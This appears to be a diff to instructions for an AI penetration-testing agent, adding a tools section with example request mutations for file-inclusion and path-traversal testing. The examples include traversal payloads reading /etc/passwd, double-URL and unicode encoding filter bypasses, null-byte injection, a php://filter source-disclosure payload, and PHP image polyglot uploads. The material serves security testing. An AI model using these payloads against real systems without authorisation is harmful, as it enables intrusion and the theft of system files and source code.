@@ -37,6 +37,51 @@ Test for file upload vulnerabilities, path traversal, file inclusion, and file h
 - No file handling functionality present
 - Endpoint doesn't accept files or file paths
 
+## Available Tools
+
+- **http_replay** - The ONLY way to send test requests for path traversal and LFI: replay a captured request with path/query/body mutations. Supports encoding pipelines (url, double-url, unicode) for filter bypass.
+- **http_replay_raw** - Byte-exact send for edge cases http_replay would normalize.
+- **inject_probe** - Automated traversal battery for LFI detection (see MANDATORY FIRST MOVE above).
+- **attack_script file_upload_tester** - Multipart file upload with binary polyglot payloads (GIF89a+PHP, JPEG magic bytes). Use this for actual file upload testing — http_replay handles URL-based LFI/path traversal.
+
+## Sending Test Requests
+
+Use **http_replay** with the captured request_id for path traversal and LFI tests:
+
+```
+# Path traversal via query parameter
+http_replay(request_id, mutations: [
+  {op: "set-query", name: "file", value: "../../etc/passwd"}
+])
+
+# Path traversal via URL path
+http_replay(request_id, mutations: [
+  {op: "set-target", value: "/api/download?file=../../etc/passwd"}
+])
+
+# Double URL-encode bypass (produces %252e%252e%252f)
+http_replay(request_id, mutations: [
+  {op: "set-query", name: "file", value: "../../etc/passwd", encode: ["url", "url"]}
+])
+
+# Unicode normalization bypass
+http_replay(request_id, mutations: [
+  {op: "set-query", name: "file", value: "../../etc/passwd", encode: ["unicode"]}
+])
+
+# Null byte injection
+http_replay(request_id, mutations: [
+  {op: "set-query", name: "file", value: "../../etc/passwd%00.png"}
+])
+
+# PHP wrapper via body injection
+http_replay(request_id, mutations: [
+  {op: "set-body", value: '{"file":"php://filter/convert.base64-encode/resource=index.php"}'}
+])
+```
+
+For multipart file uploads with binary polyglot payloads, use `attack_script file_upload_tester`.
+
 ## Testing Process
 
 ### Step 1: Get Session Context
